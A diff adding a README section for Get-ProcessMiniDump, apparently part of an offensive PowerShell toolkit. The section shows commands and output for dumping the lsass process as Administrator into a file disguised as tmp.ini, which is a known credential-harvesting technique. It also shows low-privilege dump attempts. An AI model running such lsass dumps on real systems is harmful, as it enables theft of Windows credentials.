@@ -103,4 +103,44 @@ Passwords require conversion to a secure string using ConvertTo-SecureString.
 
 AD manipulations can be scripted for automation in enterprise environments.
 
+## Get-ProcessMiniDump
 
+Create process dump using Dbghelp::MiniDumpWriteDump.
+
+``` bash
+# Elevated user dumping elevated process
+
+C:\PS> (Get-Process lsass).Id
+528
+
+C:\PS> $CallResult = Get-ProcessMiniDump -ProcID 528 -Path C:\Users\asenath.waite\Desktop\tmp.ini -Verbose
+VERBOSE: [?] Running as: Administrator
+VERBOSE: [?] Administrator privileges required
+VERBOSE: [>] Administrator privileges held
+VERBOSE: [>] Process dump success!
+
+C:\PS> $CallResult
+True
+
+# low priv user dumping low priv process
+
+C:\PS> (Get-Process calc).Id
+2424
+
+C:\PS> $CallResult = Get-ProcessMiniDump -ProcID 2424 -Path C:\Users\asenath.waite\Desktop\tmp.ini -Verbose
+VERBOSE: [?] Running as: asenath.waite
+VERBOSE: [>] Process dump success!
+
+C:\PS> $CallResult
+True
+
+# low priv user dumping elevated process
+C:\PS> $CallResult = Get-ProcessMiniDump -ProcID 4 -Path C:\Users\asenath.waite\Desktop\tmp.ini -Verbose
+VERBOSE: [?] Running as: asenath.waite
+VERBOSE: [?] Administrator privileges required
+VERBOSE: [!] Administrator privileges not held!
+
+C:\PS> $CallResult
+False
+
+```
